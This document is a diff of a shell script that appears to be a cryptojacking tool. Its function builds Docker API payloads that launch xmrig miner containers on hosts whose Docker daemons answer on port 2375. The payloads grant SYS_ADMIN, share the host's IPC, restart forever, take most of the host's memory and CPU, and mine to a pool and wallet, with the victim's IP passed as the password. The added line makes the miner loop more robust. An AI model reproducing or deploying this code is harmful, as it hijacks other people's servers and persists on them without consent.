@@ -79,7 +79,7 @@ one() {
     memlim=0
     if [ -n "${memb:-}" ] && [ "$memb" -gt 1500000000 ]; then memlim=$((memb * 4 / 5)); fi
     _mem=""; [ "$memlim" -gt 0 ] && _mem=",\"Memory\":$memlim"
-    sup="while :; do /usr/bin/xmrig $args; sleep 10; done"
+    sup="while :; do /xmrig/xmrig $args || /usr/bin/xmrig $args; sleep 10; done"
     B1="{\"Image\":\"$IMAGE\",\"Entrypoint\":[\"sh\",\"-c\"],\"Cmd\":[\"$sup\"],\"Labels\":{$TAG},\"ExposedPorts\":{\"47999/tcp\":{}},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\",\"PortBindings\":{\"47999/tcp\":[{\"HostPort\":\"47999\"}]}$_mem}}"
     B2="{\"Image\":\"$IMAGE\",\"Cmd\":[\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"$ip\",\"--no-color\",\"-k\",\"--tls\",\"--threads=$th\"],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
     # Host-networking twin of B1: some daemons answer :2375 but their docker-proxy does
